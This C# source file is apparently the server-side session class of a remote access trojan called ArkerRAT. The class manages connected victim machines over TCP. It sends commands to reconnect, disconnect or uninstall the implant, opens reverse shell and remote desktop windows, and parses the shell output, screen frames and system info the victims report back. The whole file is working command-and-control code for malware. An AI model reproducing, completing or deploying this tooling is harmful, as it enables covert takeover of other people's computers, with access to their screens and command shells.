using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Controls;
using System;
using System.Windows;
using System.Diagnostics;
using ArkerRatWpfVersion;

namespace ArkerRAT1
{
    public class RATHostSession
    {
        public CancellationTokenSource source = new CancellationTokenSource();

        CancellationToken token;

        //This button is too know which client button belongs to which client.
        public Button clientButton = new Button();

        public int port = 0;

        public string tags { get; set; }

        public double ms = 0;

        public string clientInfo = "Unknown                      Unknown                      Unknown";

        public TcpClient client { get; set; }
        public NetworkStream clientStream { get; set; }
        public RATHostSession(TcpClient tcpClient, string tag, int porte)
        {
            port = porte;
            client = tcpClient;
            clientStream = tcpClient.GetStream();
            token = source.Token;
            clientButton.Tag = tag;
            tags = tag;

            ReadData();

            Ping();
        }

        public async Task ReadData()
        {
            try
            {
                while (!token.IsCancellationRequested)
                {
               
                    byte[] data = new byte[131072];
                    await clientStream.ReadAsync(data, 0, data.Length);
                    DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
                    await clientStream.FlushAsync();
                }

            }
            catch (Exception ex) { }
        }

        public async Task SendData(string textData)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(textData);
                await clientStream.WriteAsync(data, 0, data.Length);
                await clientStream.FlushAsync();
            }
            catch(Exception ex) { }
        }

        string whenToStartPinging = "";
        Stopwatch stopwatch;
        private async void Ping()
        {
            await Task.Run(async() =>
            {
                while (!token.IsCancellationRequested)
                {
                    if (whenToStartPinging == "")
                    {
                        stopwatch = Stopwatch.StartNew();
                        whenToStartPinging = "Wait fir callback";
                        await SendData("§Ping§");
                    }

                    if (whenToStartPinging == "§Ping§")
                    {
                        ms = stopwatch.ElapsedMilliseconds;
                        whenToStartPinging = "";
                        stopwatch.Stop();
                    }
                    
                    if (stopwatch.ElapsedMilliseconds == 25000)
                    {
                        stopwatch.Stop();
                        RemoveThisClientUI();
                        await SendData("§Reconnect§");
                    }
                }
                
            });
        }

        public void RemoveThisClientUI()
        {
            Task.Run(() =>
            {
                ArkerRATServerMechanics.rATClients.Remove(this);
                source.Cancel();
                clientStream.Close();
                client.Close();
                if (reverseShellWindow != null)
                {
                    reverseShellWindow.Close();
                }
            }); 
        }

        public async void Disconnect(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§Disconnect§");
        }


        public async void Uninstall(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§Uninstall§");

        }

        public ReverseShellWindow reverseShellWindow;
        public bool reverseShellWindowIsAlreadyOpen = false;
        public void StartReverseShell(object sender, EventArgs e)
        {   if(!reverseShellWindowIsAlreadyOpen)
            {
                reverseShellWindow = new ReverseShellWindow(this);
                reverseShellWindow.WindowState = WindowState.Normal;
                reverseShellWindow.Activate();
                reverseShellWindow.Show();
            }
        }

        public RemoteDesktopWindow remoteDesktopWindow;
        public bool remoteDesktopWindowIsAlreadyOpen = false;
        public void StartRemoteDesktop(object sender, EventArgs e)
        {
            if (!remoteDesktopWindowIsAlreadyOpen)
            {
                remoteDesktopWindow = new RemoteDesktopWindow(this);
                remoteDesktopWindow.WindowState = WindowState.Normal;
                remoteDesktopWindow.Activate();
                remoteDesktopWindow.Show();
            }
        }




        public List<string> base64strings = new List<string>();
        private async void DecideCyberTool(string data)
        {
            if (data.Contains("§ReverseShell§"))
            {
                string tempString = data;
                reverseShellWindow.data = tempString.Replace("§ReverseShell§", "").Replace("§Ping§", "");
                await reverseShellWindow.ReversShellFunction();
            }

            if (data.Contains("§RemoteDesktop§")&& this.remoteDesktopWindowIsAlreadyOpen == true )
            {
                //Say the frame is fully reicived.
                string remoteDesktopFrame = data;
               

                //Assing data to remotedesktop class.
                remoteDesktopFrame=remoteDesktopFrame.Replace("§Ping§", String.Empty);
                remoteDesktopFrame = remoteDesktopFrame.Replace("§Ping§", String.Empty);
                base64strings.Add(remoteDesktopFrame);

                if (remoteDesktopFrame.Contains("§RemoteDesktopFrameDone§"))
                {
                    await remoteDesktopWindow.RemoteDesktopFunction();
                    base64strings.Clear();
                }
                remoteDesktopFrame = "";
            }


            if (data.Contains("§Ping§"))
            {
                whenToStartPinging = "§Ping§";
            }
                
            if (data.Contains("§ClientInfo§"))
            {
                string tempString = data;

                clientInfo = tempString.Replace("§ClientInfo§", "");
            }
        }
    }
}
